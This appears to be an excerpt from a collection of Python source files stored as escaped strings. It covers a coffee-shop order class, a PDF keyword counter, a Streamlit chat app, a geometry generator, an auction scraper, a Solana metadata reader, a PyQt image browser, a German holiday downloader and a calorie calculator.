@property\r\n    def beans(self):\r\n        '''gets protected beans'''\r\n        return self.__beans\r\n\r\n    @beans.setter\r\n    def beans(self, res):\r\n        self.__beans = res\r\n\r\n    @property\r\n    def milk(self):\r\n        '''gets protected milk'''\r\n        return self.__milk\r\n\r\n    @milk.setter\r\n    def milk(self, liters):\r\n        self.__milk = max(liters, 0)\r\n\r\n\r\n    def place_order(self, order:'Coffee'):\r\n        '''Function to place an order'''\r\n        if not isinstance(order, Coffee):\r\n            return \"We can't create anything that is not a Coffee instance.\"\r\n        elif not self.safety:\r\n            return 'Unfortunately, now it is not safe to make coffee.'\r\n        ###\r\n        espresso = order.espresso\r\n        milk = order.milk\r\n        name = order.name\r\n        ###\r\n        try:\r\n            price = self.MENU[name] * order.count\r\n        except KeyError:\r\n            return \"Unfortunately, we don't have such kind of coffee in the menu.\"\r\n        if self.beans >= espresso // 5 and self.milk >= milk:\r\n            self.beans -= espresso // 5\r\n            self.milk -= milk\r\n        else:\r\n            return \"Unfortunately, we don't have enough ingredients.\"\r\n        self.orders.append(order)\r\n        order.price = price\r\n        order.is_paid = True\r\n        return 'Done!'\r\n\r\n    def total_revenue(self):\r\n        '''count a total of revenue'''\r\n        ###\r\n        return sum(order.price for order in self.orders)\r\n        ###\r\n\r\n    def total_milk(self):\r\n        '''count a total of milk, necessary for orders'''\r\n        ###\r\n        return sum(order.milk for order in self.orders)\r\n        ###\r\n\r\n    def total_beans(self):\r\n        '''count a total of beans, necessary for orders'''\r\n        ###\r\n        return sum(order.espresso // 5 for order in self.orders)\r\n        ###\r\n\r\n    def milk_spoil(self, grams):\r\n        '''filters the spoiled milk\r\n        >>> day_track = Track('24.01.2024')\r\n        >>> Track.set_limit_milk(21000)\r\n        >>> day_track.milk_spoil(1000)\r\n        >>> day_track.milk\r\n        20000\r\n        '''\r\n        ###\r\n        self.milk -= grams if grams <= self.milk else 0\r\n        ###\r\n\r\n    @classmethod\r\n    def change_air_state(cls):\r\n        '''Air alarm on/of'''\r\n        if cls.safety:\r\n            cls.safety = False\r\n        else:\r\n            cls.safety = True\r\n\r\n    @classmethod\r\n    def set_limit_milk(cls, liters):\r\n        '''set the new max amount of milk avaliable'''\r\n        cls.__milk = liters\r\n\r\n\r\nclass Coffee:\r\n    '''Class to describe a regular coffee'''\r\n    __recipe = {}\r\n    is_paid = False\r\n\r\n    def __init__(self, name, count=1) -> None:\r\n        self.name = name\r\n        self.count = count\r\n        if self.name in self.__recipe:\r\n            self.is_paid = False\r\n\r\n    @property\r\n    def espresso(self):\r\n        '''get the amount of espresso necessary to make an order'''\r\n        ###\r\n        recipe = self.__recipe.get(self.name, {})\r\n        return recipe.get('espresso', 0) * self.count\r\n        ###\r\n\r\n\r\n    @property\r\n    def milk(self):\r\n        '''get the amount of milk necessary to make an order'''\r\n        ###\r\n        recipe = self.__recipe.get(self.name, {})\r\n        return (recipe.get('steamed_milk', 0) + recipe.get('foamed_milk', 0)) * self.count\r\n        ###\r\n\r\n    def __str__(self) -> str:\r\n        if self in Track.orders:\r\n            return f'Preparing {self.count} {self.name}...'\r\n        elif not self.__recipe:\r\n            return 'Order cannot be created. Recipe has not been set.'\r\n        elif self.name not in self.__recipe:\r\n            return  \"Order cannot be created. We don't have recipe for it.\"\r\n        return f'Order \"{self.count} {self.name}\" is created.'\r\n\r\n    def __repr__(self) -> str:\r\n        return f'{self.count} {self.name}'\r\n\r\n    def __eq__(self, __value: object) -> bool:\r\n        return self.name == __value.name and self.count == __value.count\r\n\r\n    @classmethod\r\n    def set_recipe(cls, recipe):\r\n        '''",
    "import PyPDF2\n# Define the chapters and their corresponding keywords\nchapters = {\n    \"Chapter 1: Introduction\": [\"introduction\", \"overview\", \"purpose\"],\n    \"Chapter 2: Methodology\": [\"method\", \"approach\", \"procedure\"],\n    \"Chapter 3: Results\": [\"result\", \"finding\", \"outcome\"],\n}\n\n\nwith open(\"your pdfname.pdf\", \"rb\") as pdf_file:\n    pdf_reader = PyPDF2.PdfReader(pdf_file)\n    text = \"\"\n    for page in pdf_reader.pages:\n        text += page.extract_text()\n\n# Split the text by newline characters (\"\\n\") instead of \"\\n\\n\"\nlines = text.split(\"\\n\")\n\n# Analyze each line and determine if it's a question\nchapter_counts = {chapter: 0 for chapter in chapters}\ncurrent_chapter = None\nfor line in lines:\n    print(f\"Line: {line}\")\n    # If the line is empty or contains only whitespace, skip it\n    if not line.strip():\n        continue\n    # If the line starts with a word that is not in the current chapter's keywords,\n    # assign the line to the next chapter\n    if current_chapter is not None and not any(keyword in line.lower() for keyword in chapters[current_chapter]):\n        current_chapter = None\n    # If the line contains a keyword from any chapter, assign the line to that chapter\n    if any(keyword in line.lower() for chapter in chapters for keyword in chapters[chapter]):\n        current_chapter = max((chapter for chapter in chapters if any(keyword in line.lower() for keyword in chapters[chapter])), key=len)\n        chapter_counts[current_chapter] += 1\n        print(f\"Assigned to chapter: {current_chapter}\")\n    # If the line is not assigned to any chapter, print a message\n    else:\n        print(f\"Unassigned line: {line}\")\n\n# Print the chapter counts\nfor chapter, count in chapter_counts.items():\n    print(f\"{chapter}: {count}\")\n",
    "import os\nfrom dotenv import load_dotenv\nfrom pinecone import Pinecone\nimport streamlit as st\nfrom llama_index.core import Settings, VectorStoreIndex\nfrom llama_index.embeddings.azure_openai import AzureOpenAIEmbedding\nfrom llama_index.llms.azure_openai import AzureOpenAI\nfrom llama_index.vector_stores.pinecone import PineconeVectorStore\n\nload_dotenv()\n\n\n@st.cache_resource(show_spinner=False)\ndef get_index() -> VectorStoreIndex:\n    pc = Pinecone(api_key=os.environ.get(\"PINECONE_API_KEY\"))\n    pc_index = pc.Index(host=os.environ.get(\"PINECONE_HOST\"))\n\n    Settings.embed_model = AzureOpenAIEmbedding(\n        model=\"text-embedding-ada-002\",\n        deployment_name=\"corpu-text-embedding-ada-002\",\n        api_key=os.getenv(\"AZURE_API_KEY\"),\n        azure_endpoint=os.getenv(\"AZURE_API_BASE\"),\n        api_version=\"2023-05-15\",\n    )\n\n    Settings.llm = AzureOpenAI(\n        model=\"text-davinci-003\",\n        deployment_name=\"corpu-text-davinci-003\",\n        temperature=0,\n        api_key=os.getenv(\"AZURE_API_KEY\"),\n        azure_endpoint=os.getenv(\"AZURE_API_BASE\"),\n        api_version=\"2023-05-15\",\n    )\n    vector_store = PineconeVectorStore(pinecone_index=pc_index)\n\n    return VectorStoreIndex.from_vector_store(vector_store=vector_store)\n\n\nindex = get_index()\nif \"chat_engine\" not in st.session_state.keys():\n    st.session_state.chat_engine = index.as_chat_engine(chat_mode=\"context\", verbose=True)\n\nst.set_page_config(\n    page_title=\"Sysmpellpy Docs helper\",\n    page_icon=\"\ud83d\udcda\",\n    layout=\"centered\",\n    initial_sidebar_state=\"auto\",\n    menu_items=None,\n)\n\nst.title(\"Sysmpellpy Docs helper \ud83d\udcda\")\n\nif \"messages\" not in st.session_state.keys():\n    st.session_state.messages = [{\n        \"role\": \"assistant\",\n        \"content\": \"Hello! I'm here to help you with Sysmpellpy documentation. How can I help you today?\",\n    }]\n    \nif prompt := st.chat_input(\"your question\"):\n    st.session_state.messages.append({\n        \"role\": \"user\", \n        \"content\": prompt\n    })\n    \nfor message in st.session_state.messages:\n    with st.chat_message(message[\"role\"]):\n        st.write(message[\"content\"])        \n\nif st.session_state[\"messages\"][-1][\"role\"] != \"assistant\":\n    with st.chat_message(\"assistant\"):\n        with st.spinner(\"Thinking...\"):\n            response = st.session_state.chat_engine.chat(message=str(prompt))\n            st.write(response.response)\n            message = {\"role\": \"assistant\", \"content\": response.response}\n            st.session_state.messages.append(message)",
    "# file: rect-with-hole.py\n# vim:fileencoding=utf-8:ft=python\n\"\"\"Script to generate the CGX geometry for a rectangle with a hole.\"\"\"\n\nimport argparse\nimport logging\nimport math\nimport sys\n\n__version__ = \"2023.10.08\"\n\n\nformats = {\n    \"XY\": (\"pnt p{0} {1:.6f} {2:.6f} {3:.6f}\", \"pnt cp {0:.6f} {1:.6f} {2:.6f}\"),\n    \"XZ\": (\"pnt p{0} {1:.6f} {3:.6f} {2:.6f}\", \"pnt cp {0:.6f} {2:.6f} {1:.6f}\"),\n    \"YZ\": (\"pnt p{0} {3:.6f} {1:.6f} {2:.6f}\", \"pnt cp {2:.6f} {0:.6f} {1:.6f}\"),\n}\n\nparser = argparse.ArgumentParser(description=__doc__)\nparser.add_argument(\"-v\", \"--version\", action=\"version\", version=__version__)\nparser.add_argument(\n    \"--log\",\n    default=\"warning\",\n    choices=[\"debug\", \"info\", \"warning\", \"error\"],\n    help=\"logging level (defaults to 'warning')\",\n)\nparser.add_argument(\n    \"-p\",\n    \"--plane\",\n    default=\"XY\",\n    choices=[\"XY\", \"XZ\", \"YZ\"],\n    help=\"plane for the geometry to sit in (defaults to XY)\",\n)\nparser.add_argument(\n    \"--poff\",\n    default=0.0,\n    type=float,\n    help=\"offset from the plane (defaults to 0)\",\n)\nparser.add_argument(\n    \"--hoff\",\n    default=0.0,\n    type=float,\n    help=\"horizontal offset of the hole in the rectangle (defaults to 1/2 the width)\",\n)\nparser.add_argument(\n    \"--voff\",\n    default=0.0,\n    type=float,\n    help=\"vertical offset of the hole in the rectangle (defaults to 1/2 the height)\",\n)\nparser.add_argument(\n    \"--width\",\n    default=30.0 / 1000,\n    type=float,\n    help=\"rectangle width (defaults to 0.030)\",\n)\nparser.add_argument(\n    \"--height\",\n    default=20.0 / 1000,\n    type=float,\n    help=\"rectangle height (defaults to 0.020)\",\n)\nparser.add_argument(\n    \"--dia\",\n    default=6.0 / 1000,\n    type=float,\n    help=\"hole diameter (defaults to 0.006)\",\n)\nparser.add_argument(\n    \"--div\",\n    default=8,\n    type=int,\n    help=\"line divisions (defaults to 8)\",\n)\n\nargs = parser.parse_args(sys.argv[1:])\n# Configure logging\nlogging.basicConfig(\n    level=getattr(logging, args.log.upper(), None),\n    format=\"%(levelname)s: %(message)s\",\n)\nargs.plane = args.plane.upper()\n\nprint(f\"# Generated by {sys.argv[0]}\")\nprint(\"# with arguments:\", *sys.argv[1:])\n\nif args.hoff == 0:\n    args.hoff = args.width / 2\nif args.voff == 0:\n    args.voff = args.height / 2\n\np1 = (0, 0)\np2 = (args.width, 0)\np3 = (args.width, args.height)\np4 = (0, args.height)\ncp = (args.hoff, args.voff)\n\ndivl = args.div\n\nd1 = (cp[0] - p1[0], cp[1] - p1[1])\nl1 = math.sqrt(d1[0] ** 2 + d1[1] ** 2)\nl1 = (l1 - args.dia / 2) / l1\np5 = (p1[0] + l1 * d1[0], p1[1] + l1 * d1[1])\n\nd2 = (cp[0] - p2[0], cp[1] - p2[1])\nl2 = math.sqrt(d2[0] ** 2 + d2[1] ** 2)\nl2 = (l2 - args.dia / 2) / l2\np6 = (p2[0] + l2 * d2[0], p2[1] + l2 * d2[1])\n\nd3 = (cp[0] - p3[0], cp[1] - p3[1])\nl3 = math.sqrt(d3[0] ** 2 + d3[1] ** 2)\nl3 = (l3 - args.dia / 2) / l3\np7 = (p3[0] + l3 * d3[0], p3[1] + l3 * d3[1])\n\nd4 = (cp[0] - p4[0], cp[1] - p4[1])\nl4 = math.sqrt(d4[0] ** 2 + d4[1] ** 2)\nl4 = (l4 - args.dia / 2) / l4\np8 = (p4[0] + l4 * d4[0], p4[1] + l4 * d4[1])\n\nfor n, (x, y) in enumerate((p1, p2, p3, p4, p5, p6, p7, p8), start=1):\n    print(formats[args.plane][0].format(n, x, y, args.poff))\nprint(formats[args.plane][1].format(cp[0], cp[1], args.poff))\n\nfor j in range(1, 4):\n    print(f\"line l{j} p{j} p{j+4} {divl}\")\n    print(f\"line l{j+4} p{j} p{j+1} {divl}\")\n    print(f\"line l{j+8} p{j+4} p{j+5} cp {divl}\")\nprint(f\"line l4 p4 p8 {divl}\")\nprint(f\"line l8 p4 p1 {divl}\")\nprint(f\"line l12 p8 p5 cp {divl}\")\nprint(\"surf s1 blend l1 l9 l2 l5\")\nprint(\"surf s2 blend l2 l10 l3 l6\")\nprint(\"surf s3 blend l3 l11 l4 l7\")\nprint(\"surf s4 blend l4 l12 l8 l1\")\n\nprint(\"plot pa all\")\nprint(\"plus la all\")\nprint(\"plus sa all\")\n",
    "'''\nAuthor: Nicholas Chorette\nDate: 4/14/2024\nPurpose: Need things for new appartment, and this is the easiest way to make sure that I am ahead of the curve - Just webscrape & constantly check the price. of an item. if that item is greater than the numeric limit I initially set for it, then It will SCREAM @ me that someone has out-bid me, and give me the link to re-bid for an item. 2nd option is to drop the item.\n'''\n\n# https://brandonauction.hibid.com/lot/193140070/wii-game-system\n\n\n\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.chrome.service import Service\n\n# Set path to your WebDriver executable\nwebdriver_path = 'C:\\\\Users\\\\nicpi\\\\OneDrive\\\\Documents\\\\WebscrapeAuction\\\\chromedriver-win32\\\\chromedriver.exe'\nservice = Service(executable_path=webdriver_path)\n\n# Set up Chrome options\nchrome_options = Options()\n# You can add other options if necessary\n# For example, running Chrome in headless mode:\n#chrome_options.add_argument(\"--headless\")\n\nchrome_options.add_argument(\"--window-size=1,1\")\n\n\n# Initialize the driver with the specified service and options\n#driver = webdriver.Chrome(service=service, options=chrome_options) #This is responcible for opening the chrome tab to check things \n\nimport time \nfrom testOutput import *\nfileName = \"scrapeOutput.txt\"\ndef writeData(data): \n    file1 = open(fileName, \"w\")  # append mode\n    file1.write(data)\n    file1.close()\n\n#------------The Main Code----------\ndef getItemData(webURL): \n\n    driver = webdriver.Chrome(service=service, options=chrome_options)\n\n    try:\n        #driver.get('https://www.google.com/search?q=time')\n        driver.get(str(webURL))\n        time.sleep(0.25) #<-------------REQUIRED to function consistently------------------------ otherwise, it will not work. Depending on your internet speeds, you may need to increase this number \n        content = driver.page_source\n        #print(content)\n\n        writeData(content)\n\n        a = check_high_bid(fileName)\n        if a == 9999999.99: \n            print(\"ERR: Failed to get item - Attempting again...\")\n            getItemData(webURL) #try that again, cause it messed up\n\n        print(\"\\n\" + webURL + \" - \" + a)\n        #return a\n    finally:\n        driver.quit()\n\"\"\" \ngetItemData('https://brandonauction.hibid.com/lot/193140070/wii-game-system') \"\"\"\n\n\n",
    "import json\r\nimport requests\r\nfrom solana.rpc.api import Client\r\nimport struct\r\nfrom solders.pubkey import Pubkey # type: ignore\r\nimport base58\r\n\r\ndef get_data_from_uri(uri):\r\n    response = requests.get(uri)\r\n    if response.status_code == 200:\r\n        return response.json()\r\n    else:\r\n        raise Exception(f\"Failed to fetch data from URI: {uri}\")\r\n\r\ndef get_metadata_account(token_contract):\r\n    METADATA_PROGRAM_ID = Pubkey.from_string('metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s')\r\n    return Pubkey.find_program_address(\r\n        [b'metadata', bytes(METADATA_PROGRAM_ID), bytes(Pubkey.from_string(token_contract))],\r\n        METADATA_PROGRAM_ID\r\n    )[0]\r\n\r\ndef unpack_metadata_account(data):\r\n    assert(data[0] == 4)\r\n    i = 1\r\n    source_account = base58.b58encode(bytes(struct.unpack('<' + \"B\"*32, data[i:i+32])))\r\n    i += 32\r\n    mint_account = base58.b58encode(bytes(struct.unpack('<' + \"B\"*32, data[i:i+32])))\r\n    i += 32\r\n    name_len = struct.unpack('<I', data[i:i+4])[0]\r\n    i += 4\r\n    name = struct.unpack('<' + \"B\"*name_len, data[i:i+name_len])\r\n    i += name_len\r\n    symbol_len = struct.unpack('<I', data[i:i+4])[0]\r\n    i += 4 \r\n    symbol = struct.unpack('<' + \"B\"*symbol_len, data[i:i+symbol_len])\r\n    i += symbol_len\r\n    uri_len = struct.unpack('<I', data[i:i+4])[0]\r\n    i += 4 \r\n    uri = struct.unpack('<' + \"B\"*uri_len, data[i:i+uri_len])\r\n    i += uri_len\r\n    fee = struct.unpack('<h', data[i:i+2])[0]\r\n    i += 2\r\n    has_creator = data[i] \r\n    i += 1\r\n    creators = []\r\n    verified = []\r\n    share = []\r\n    if has_creator:\r\n        creator_len = struct.unpack('<I', data[i:i+4])[0]\r\n        i += 4\r\n        for _ in range(creator_len):\r\n            creator = base58.b58encode(bytes(struct.unpack('<' + \"B\"*32, data[i:i+32])))\r\n            creators.append(creator)\r\n            i += 32\r\n            verified.append(data[i])\r\n            i += 1\r\n            share.append(data[i])\r\n            i += 1\r\n    primary_sale_happened = bool(data[i])\r\n    i += 1\r\n    is_mutable = bool(data[i])\r\n    metadata = {\r\n        \"update_authority\": source_account.decode(\"utf-8\"),\r\n        \"mint\": mint_account.decode(\"utf-8\"),\r\n        \"data\": {\r\n            \"name\": bytes(name).decode(\"utf-8\").strip(\"\\x00\"),\r\n            \"symbol\": bytes(symbol).decode(\"utf-8\").strip(\"\\x00\"),\r\n            \"uri\": bytes(uri).decode(\"utf-8\").strip(\"\\x00\"),\r\n            \"seller_fee_basis_points\": fee,\r\n            \"creators\": creators,\r\n            \"verified\": verified,\r\n            \"share\": share,\r\n        },\r\n        \"primary_sale_happened\": primary_sale_happened,\r\n        \"is_mutable\": is_mutable,\r\n    }\r\n    return metadata\r\n\r\ndef get_metadata(rpc, token_contract):\r\n    client = Client(rpc)\r\n    metadata_account = get_metadata_account(token_contract)\r\n    data = client.get_account_info(metadata_account).value.data\r\n    metadata = unpack_metadata_account(data)\r\n    return metadata\r\n\r\nif __name__ == \"__main__\":\r\n    rpc = \"https://api.mainnet-beta.solana.com\"\r\n    token_contract = \"some_token_address\"\r\n    metadata = get_metadata(rpc, token_contract)\r\n    uri = metadata[\"data\"][\"uri\"]\r\n    uri_data = get_data_from_uri(uri)\r\n    metadata[\"data\"].update(uri_data)\r\n    print(json.dumps(metadata, indent=4))",
    "# -*- coding: utf-8 -*-\n\"\"\"\n@author: C\u00e9dric Berteletti\nFolder explorer\n\"\"\"\n\nimport logging\nfrom os import listdir\nfrom os.path import isfile, join\n\nfrom PyQt6.QtCore import Qt, pyqtSignal\nfrom PyQt6.QtWidgets import  QStyle, QFileDialog, QFrame, QScrollArea, QPushButton, QGridLayout, QVBoxLayout, QHBoxLayout\n\nfrom services.mipmaps import MipmapLevels, MipmapService\nimport services.settings as settings\nfrom services.states import ImageState\nfrom ui.image_vignette import ImageVignette\nfrom ui.ui_utils import set_default_layout_params\n\n\n\nclass FolderExplorer(QFrame):\n    \"Displays the image present in a folder\"\n\n    imageSelected = pyqtSignal(ImageState)\n\n    def __init__(self):\n        super().__init__()\n        self.folderpath = \"\"\n        self.images = []\n        self.scrollContent = None\n        self.init_ui()\n\n\n\n    def init_ui(self):\n        self.setLayout(QVBoxLayout(self))\n        set_default_layout_params(self.layout())\n\n        # Toolbar - BEGIN\n        self.toolbar = QFrame(self)\n        self.toolbar.setLayout(QHBoxLayout(self.toolbar))\n        set_default_layout_params(self.toolbar.layout())\n        self.layout().addWidget(self.toolbar)\n\n        # Home folder button\n        pixmapi = QStyle.StandardPixmap.SP_DirHomeIcon\n        icon = self.style().standardIcon(pixmapi)\n        home_button = QPushButton(icon, \"\")\n        self.toolbar.layout().addWidget(home_button)\n        home_button.clicked.connect(self.select_folder)\n\n        # Toolbar - END\n        self.toolbar.layout().addStretch()\n\n        # Images scroll area\n        self.scroll = QScrollArea(self)\n        self.layout().addWidget(self.scroll)\n        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)\n        self.scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)\n        self.scroll.setWidgetResizable(True)\n        self.scroll.setMinimumWidth(MipmapService().mipmap_size(MipmapLevels.VIGNETTE)+10)\n\n\n    def resizeEvent(self, event):\n        if self.scrollContent:\n            new_nb_columns = self.nb_columns_possible()\n            if new_nb_columns != self.nb_columns:\n                self.init_scroll_content()\n        return super(FolderExplorer, self).resizeEvent(event)\n\n\n    def select_folder(self):\n        self.folderpath = QFileDialog.getExistingDirectory(self, settings.get(\"msg.select_folder\"))\n        self.init_images()\n        self.init_scroll_content()\n\n\n    def init_images(self):\n        self.images = []\n        \n        if self.folderpath:\n            logging.info(f\"New source folder : {self.folderpath}\")\n            files = [f for f in listdir(self.folderpath) if isfile(join(self.folderpath, f))]\n\n            for f in files:\n                image = ImageState(join(self.folderpath, f))\n                self.images.append(image)\n\n\n    def init_scroll_content(self):\n        self.scrollContent = QFrame(self.scroll)\n        self.scroll.setWidget(self.scrollContent)\n        layout = QGridLayout(self.scrollContent)\n        set_default_layout_params(layout)\n\n        self.nb_columns = self.nb_columns_possible()\n\n        index_row = 0\n        index_col = 0\n        for image in self.images:\n                vignette = ImageVignette(image)\n                vignette.clicked.connect(self.image_selected)\n\n                layout.addWidget(vignette, index_row, index_col)\n                index_col += 1\n                if index_col == self.nb_columns:\n                    index_col = 0\n                    index_row += 1\n\n        layout.setRowStretch(layout.rowCount(), 1)\n\n\n    def nb_columns_possible(self):\n        return self.geometry().width() // MipmapService().mipmap_size(MipmapLevels.VIGNETTE)\n\n    \n    def image_selected(self, image):        \n        logging.debug(f\"New image selected for process/display : {image.original_image_path}\")\n        self.imageSelected.emit(image)\n\n                \n",
    "import requests\nimport pandas as pd\n\n# Vorbereitung f\u00fcr API-Anfrage\nstates = [\"NATIONAL\",\"BW\",\"BY\",\"BE\",\"BB\",\"HB\",\"HH\",\"HE\",\"MV\",\"NI\",\"NW\",\"RP\",\"SL\",\"SN\",\"ST\",\"SH\",\"TH\"] # Liste aller Bundesl\u00e4nder\nyears = [str(1999 + i) for i in range(1, 32)] # Auflistung Jahre 2000 - 2030\n\n# Abfrage nach Muster: Je Staat werden alle Jahre nacheinander abgefragt und zwischengespeichert\n# Am Ende werden dann alle zwischengespeicherte DataFrames zusammengef\u00fchrt.\nfull_data = []\nfor s in states:\n  states_data = []\n  for y in years:\n    r = requests.get(f\"https://feiertage-api.de/api/?jahr={y}&nur_land={s}\")\n    data = r.json()\n    df_new = pd.DataFrame.from_dict(data, orient='index').reset_index() \n    df_new.columns = ['Feiertag', 'Datum', 'Hinweis']\n    df_new[s] = 1\n    states_data.append(df_new) # Hier wird immer ein DataFrame mit Informationen eines Jahr f\u00fcr ein Bundesland hinzugef\u00fcgt\n  year_data = pd.concat(states_data, axis=0) # Hier werden dann alle Jahre f\u00fcr ein Bundesland zusammengebracht\n  full_data.append(year_data) # Hier werden alle DataFrames hinzugef\u00fcgt\n\n# Alle DataFrames werden nacheinander gemerged und doppelte Spalten ausgeschlossen, sowie die Formatierung und Null Werte \u00fcberarbeitet.\nlast_df = full_data[0] \nfor i in full_data[1:]:\n  df = pd.merge(left=last_df, right=i, on=\"Datum\", how=\"outer\")\n  df[\"Feiertag_x\"].fillna(df[\"Feiertag_y\"], inplace=True)\n  df[\"Hinweis_x\"].fillna(df[\"Hinweis_y\"], inplace=True)\n  df.drop([\"Feiertag_y\", \"Hinweis_y\"], axis=1, inplace=True)\n  df.rename(columns={\"Feiertag_x\": \"Feiertag\", \"Hinweis_x\":\"Hinweis\"}, inplace=True)\n  last_df = df\n\n# Bei Feiertagen, die es nur in bestimmten Bundesl\u00e4nder gibt ist der Wert bei L\u00e4nder, die diesen Tag nicht feiern Null\n# Daher werden Null Values in Integer 0 umgewandelt.\ndf.fillna(0, inplace=True)\ndf\n\n# Zuletzt wird der fertige DataFrame als csv Datei abgespeichert.\ndf.to_csv(\"deutsche_feiertage__2000_2030.csv\", index=False)",
    "import tkinter as tk\r\nfrom tkinter import messagebox\r\n\r\n# Set up the color scheme\r\nBG_COLOR = '#00FF00' # Soft white\r\nTEXT_COLOR = '#010101' # Soft black\r\nBUTTON_COLOR = '#FFF' # Soft green\r\n\r\nactivity_level = {\r\n    \"\u041d\u0438\u0437\u043a\u0430\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u044c\": 1.2,\r\n    \"\u041d\u0435\u0431\u043e\u043b\u044c\u0448\u0430\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u044c\": 1.375,\r\n    \"\u0423\u043c\u0435\u0440\u0435\u043d\u043d\u0430\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u044c\": 1.55,\r\n    \"\u041f\u043e\u0432\u044b\u0448\u0435\u043d\u043d\u0430\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u044c\": 1.725,\r\n    \"\u0412\u044b\u0441\u043e\u043a\u0430\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u044c\": 1.9\r\n}\r\n\r\ndef calculate_calories():\r\n    height = entry_height.get()\r\n    weight = entry_weight.get()\r\n    age = entry_age.get()\r\n\r\n    if not height or not weight or not age:\r\n        messagebox.showerror(\"Error\", \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u0432\u0432\u043e\u0434.\")\r\n        return\r\n\r\n    height = float(height)\r\n    weight = float(weight)\r\n    age = float(age)\r\n\r\n    # Calculate the Basal Metabolic Rate (BMR) using the Mifflin-St Jeor equation\r\n    bmr = 10 * weight + 6.25 * height - 5 * age + 5\r\n\r\n    # Calculate the total number of calories needed per day\r\n    total_calories = int(bmr * activity_level[var_activity.get()])\r\n\r\n    # Suggest a possible diet with that number of calories\r\n    breakfast = int(total_calories * 0.3)\r\n    lunch = int(total_calories * 0.4)\r\n    dinner = int(total_calories - breakfast - lunch)\r\n\r\n    print(breakfast, lunch, dinner)\r\n\r\n    # Generating meals\r\n    breakfast_example = \"\"\r\n    if 0 <= breakfast <= 750:\r\n        breakfast_example = \"\u041e\u0432\u0441\u044f\u043d\u044b\u0435 \u0445\u043b\u043e\u043f\u044c\u044f, \u0432\u043e\u0434\u0430\"\r\n    elif 750 <= breakfast <= 1000:\r\n        breakfast_example = \"\u042f\u0438\u0447\u043d\u0438\u0446\u0430 \u0438\u0437 2 \u044f\u0438\u0446 \u0441 \u0441\u044b\u0440\u043e\u043c \u0438 \u0444\u0440\u0443\u043a\u0442\u043e\u0432\u044b\u0439 \u0441\u0430\u043b\u0430\u0442\"\r\n    elif 1000 <= breakfast <= 1500:\r\n        breakfast_example = \"\u041f\u0435\u0447\u0435\u043d\u044b\u0435 \u044f\u0439\u0446\u0430 \u0441 \u0431\u0435\u043a\u043e\u043d\u043e\u043c \u0438 \u043e\u0432\u043e\u0449\u0430\u043c\u0438\"\r\n    else:\r\n        breakfast_example = \"\u041a\u043e\u043b-\u0432\u043e \u043a\u043a\u0430\u043b \u0431\u043e\u043b\u044c\u0448\u0435 \u043b\u0438\u043c\u0438\u0442\u0430\"\r\n\r\n    lunch_example = \"\"\r\n    if 0 <= lunch <= 750:\r\n        lunch_example = \"\u041c\u0430\u043a\u0430\u0440\u043e\u043d\u044b \u0441 \u0442\u043e\u043c\u0430\u0442\u043d\u044b\u043c \u0441\u043e\u0443\u0441\u043e\u043c\"\r\n    elif 750 <= lunch <= 1100:\r\n        lunch_example = \"\u0422\u0443\u0448\u0435\u043d\u0430\u044f \u043a\u0443\u0440\u0438\u0446\u0430 \u0441 \u043e\u0432\u043e\u0449\u0430\u043c\u0438\"\r\n    elif 1100 <= lunch <= 1700:\r\n        lunch_example = \"\u041a\u0443\u0440\u0438\u043d\u044b\u0439 \u0441\u0443\u043f \u0441 \u043e\u0432\u043e\u0449\u0430\u043c\u0438\"\r\n    else:\r\n        lunch_example = \"\u041a\u043e\u043b-\u0432\u043e \u043a\u043a\u0430\u043b \u0431\u043e\u043b\u044c\u0448\u0435 \u043b\u0438\u043c\u0438\u0442\u0430\"\r\n\r\n    dinner_example = \"\"\r\n    if 0 <= dinner <= 750:\r\n        dinner_example = \"\u041f\u0430\u0441\u0442\u0430 \u0441 \u043c\u043e\u0440\u0435\u043f\u0440\u043e\u0434\u0443\u043a\u0442\u0430\u043c\u0438\"\r\n    elif 750 <= dinner <= 1000:\r\n        dinner_example = \"\u0421\u0442\u0435\u0439\u043a \u0438\u0437 \u0442\u0443\u043d\u0446\u0430, \u043e\u0432\u043e\u0449\u043d\u043e\u0439 \u0441\u0430\u043b\u0430\u0442\"\r\n    elif 1000 <= dinner <= 1500:\r\n        dinner_example = \"\u0420\u0438\u0441 \u0441 \u043a\u0443\u0440\u0438\u0446\u0435\u0439 \u0438 \u0441\u043e\u0443\u0441\u043e\u043c, \u0445\u043b\u0435\u0431\"\r\n    else:\r\n        dinner_example = \"\u041a\u043e\u043b-\u0432\u043e \u043a\u043a\u0430\u043b \u0431\u043e\u043b\u044c\u0448\u0435 \u043b\u0438\u043c\u0438\u0442\u0430\"\r\n    \r\n    message = f\"\u0412\u044b \u0434\u043e\u043b\u0436\u043d\u044b \u0435\u0441\u0442\u044c {total_calories} \u043a\u043a\u0430\u043b \u0432 \u0434\u0435\u043d\u044c.\\n\u0412\u044b \u0434\u043e\u043b\u0436\u043d\u044b \u043f\u043e\u0442\u0440\u0435\u0431\u043b\u044f\u0442\u044c {int(int(weight) * activity_level[var_activity.get()])}\u0433. \u0431\u0435\u043b\u043a\u043e\u0432 \u0432 \u0434\u0435\u043d\u044c.\\n\u0412\u044b \u0434\u043e\u043b\u0436\u043d\u044b \u043f\u043e\u0442\u0440\u0435\u0431\u043b\u044f\u0442\u044c {int(int(weight) * 1.2)}\u0433. \u0436\u0438\u0440\u043e\u0432 \u0432 \u0434\u0435\u043d\u044c.\\n\u0412\u044b \u0434\u043e\u043b\u0436\u043d\u044b \u043f\u043e\u0442\u0440\u0435\u0431\u043b\u044f\u0442\u044c {int(int(weight)*2)}\u0433. \u0443\u0433\u043b\u0432\u0435\u0432\u043e\u0434\u043e\u0432 \u0432 \u0434\u0435\u043d\u044c\\n\\n\"\r\n    message += f\"\u0417\u0430\u0432\u0442\u0440\u0430\u043a: {breakfast_example}\\n\"\r\n    message += f\"\u041e\u0431\u0435\u0434: 